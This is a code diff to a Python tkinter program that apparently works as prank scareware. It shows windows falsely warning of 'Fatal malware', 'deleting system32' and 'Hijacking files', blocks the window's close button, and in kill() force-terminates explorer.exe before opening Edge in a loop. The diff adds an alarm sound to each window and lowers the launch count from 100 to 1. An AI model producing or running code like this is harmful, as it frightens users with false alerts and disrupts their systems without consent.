@@ -2,7 +2,10 @@
 import os
 from tkinter import *
 from PIL import ImageTk, Image
+import pygame
 #========================================
+
+pygame.mixer.init()
 
 #warning windows
 w = Tk()
@@ -11,6 +14,8 @@ w.title('error!')
 w.iconbitmap('error.ico')
 w.resizable(False, False)
 w.configure(bg='black')
+pygame.mixer.music.load("erro.mp3")
+pygame.mixer.music.play(loops=0)
 path = "error.ico"
 img = ImageTk.PhotoImage(Image.open(path))
 
@@ -30,6 +35,8 @@ w.iconbitmap('error.ico')
 w.resizable(False, False)
 w.configure(bg='black')
 path = "error.ico"
+pygame.mixer.music.load("erro.mp3")
+pygame.mixer.music.play(loops=0)
 img = ImageTk.PhotoImage(Image.open(path))
 
 lb = Label(w, text= 'Fatal malware detected! Take actions immediately     ', font=("System", 8))
@@ -48,6 +55,8 @@ w.iconbitmap('error.ico')
 w.resizable(False, False)
 w.configure(bg='black')
 path = "error.ico"
+pygame.mixer.music.load("erro.mp3")
+pygame.mixer.music.play(loops=0)
 img = ImageTk.PhotoImage(Image.open(path))
 
 lb = Label(w, text= 'Fatal malware detected! Take actions immediately     ', font=("System", 8))
@@ -68,6 +77,8 @@ w.iconbitmap('error.ico')
 w.resizable(False, False)
 w.configure(bg='black')
 w.geometry('400x185')
+pygame.mixer.music.load("erro.mp3")
+pygame.mixer.music.play(loops=0)
 #===========================================
 
 #Can close window event
@@ -89,6 +100,8 @@ def no():
      w.iconbitmap('error.ico')
      w.resizable(False, False)
      w.configure(bg='black')
+     pygame.mixer.music.load("erro.mp3")
+     pygame.mixer.music.play(loops=0)
 
      lb = Label(w, text= 'deleting system32...')
      lb.configure(bg='black', foreground='white')
@@ -123,6 +136,8 @@ def yes():
     w.iconbitmap('error.ico')
     w.resizable(False, False)
     w.configure(bg='black')
+    pygame.mixer.music.load("erro.mp3")
+    pygame.mixer.music.play(loops=0)
 
     lb0 = Label(w, text= 'Hijacking files.....')
     lb0.configure(bg='black', foreground='white', font=("Terminal", 11))
@@ -165,7 +180,7 @@ def kill():
     os.system("taskkill /f /im  explorer.exe")
     w.destroy()
 
-    num = 100
+    num = 1
     for _ in range(num):
         os.startfile("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
 #=====================================================
@@ -173,4 +188,4 @@ def kill():
 #window mainloop
 w.protocol("WM_DELETE_WINDOW", disable_event)
 w.mainloop()
-#=======================================================
+#=====================================================
